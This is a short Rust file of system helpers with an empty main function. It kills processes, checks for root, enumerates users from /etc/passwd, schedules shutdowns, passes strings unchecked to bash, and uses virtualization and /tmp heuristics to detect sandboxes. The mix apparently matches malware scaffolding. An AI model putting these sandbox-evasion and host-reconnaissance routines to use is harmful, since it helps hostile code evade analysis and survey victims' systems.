use std::convert::TryInto;
use std::fs::read_dir;
use std::process::Command;

fn kill_proc_by_pid(pid: u32) -> String {
    let p = pid.to_string();
    let cmd = "kill -9 ".to_owned() + &p;
    let (_, err) = cmd_out(&cmd);
    err
}

fn info() -> String {
    match Command::new("whoami").output() {
        Ok(output) => return String::from_utf8_lossy(&output.stdout).replace("\n", ""),
        Err(err) => "N/A".to_string(),
    }
}

fn is_root() -> bool {
    let (u, err) = cmd_out("whoami");
    if u == "root" {
        true
    } else {
        false
    }
}

fn cmd_out(command: &str) -> (String, String) {
    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("Failed to execute command");
    let out = String::from_utf8_lossy(&output.stdout).replace("\n", "");
    let err = String::from_utf8_lossy(&output.stderr).replace("\n", "");
    (out, err)
}

fn sandbox_filepath() -> bool {
    let (out, err) = cmd_out("systemd-detect-virt");
    out != "none"
}

fn sandbox_tmp(entries: u32) -> bool {
    let files = read_dir("/tmp");
    let s = match files {
        Ok(x) => x,
        Err(_) => return true,
    };

    let s = s.count() + 2;

    s < entries.try_into().unwrap()
}

fn shutdown() -> String {
    let c = "shutdown +1";
    let (out, err) = cmd_out(c);
    err
}

fn users() -> Result<Vec<String>, std::io::Error> {
    Command::new("cut")
        .arg("-d:")
        .arg("-f1")
        .arg("/etc/passwd")
        .output()
        .map(|output| {
            String::from_utf8_lossy(&output.stdout)
                .split('\n')
                .map(|s| s.to_string())
                .collect()
        })
}

fn main() {}
